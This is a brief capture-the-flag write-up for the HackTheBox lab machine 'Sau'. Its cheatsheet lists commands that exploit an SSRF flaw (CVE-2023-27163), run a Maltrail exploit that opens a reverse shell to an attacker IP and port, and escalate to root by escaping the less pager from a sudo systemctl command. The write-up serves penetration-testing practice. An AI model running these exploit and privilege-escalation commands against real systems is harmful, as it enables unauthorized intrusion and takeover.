# Sau \[Linux Easy]

## Report

The http server is filtered and the webrequest hosted on port 55555 performs the requests as an intermediary. This is prone to SSRF and CVE-2023-27163 allows us to perform that.

The user is allowed to check the status of trail.service as sudo, since the output is too large it is passed to less which can be exploited to become root.&#x20;

## Cheatsheet

```
nmap -sV -sC 10.10.11.224 -v
git clone https://github.com/entr0pie/CVE-2023-27163
./CVE-2023-27163.sh http://10.10.11.224:55555/ http://127.0.0.1:80 
Maltrail-v0.53-Exploit
python3 exploit.py 10.10.14.29 9001 http://10.10.11.224:55555/gusqoa

python3 -c 'import pty; pty.spawn("/bin/bash")'
sudo -l
sudo /usr/bin/systemctl status trail.service
(passes output to less cus many lines in output)
!/bin/sh
```

## Loot

Powered by Maltrail (v0.53)

User puma may run the following commands on sau: \
(ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service

This should tell you that you DON'T need a password for this command so when you did run a sudo command and asked for the password, it wasn't the right one you idiot and then went off to find creds for puma
